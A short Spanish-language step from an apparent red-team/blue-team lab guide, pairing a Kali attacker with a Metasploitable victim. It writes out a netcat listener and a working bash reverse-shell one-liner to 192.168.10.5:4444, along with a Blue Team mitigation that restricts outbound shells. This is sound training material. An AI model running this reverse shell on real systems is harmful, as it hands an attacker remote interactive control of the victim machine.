# 6. Reverse shell

## Comando
# En Kali (atacante)
# nc -lvnp 4444
# En víctima (Metasploitable)
# bash -i >& /dev/tcp/192.168.10.5/4444 0>&1

## Por qué
Permite al atacante conectarse a la víctima desde el exterior.

## Antes / Después
- Antes: servicio activo y sin control.  
- Después: Blue Team restringe salida de shell reversa.

## Resultado esperado
- Shell interactiva en la máquina atacante.
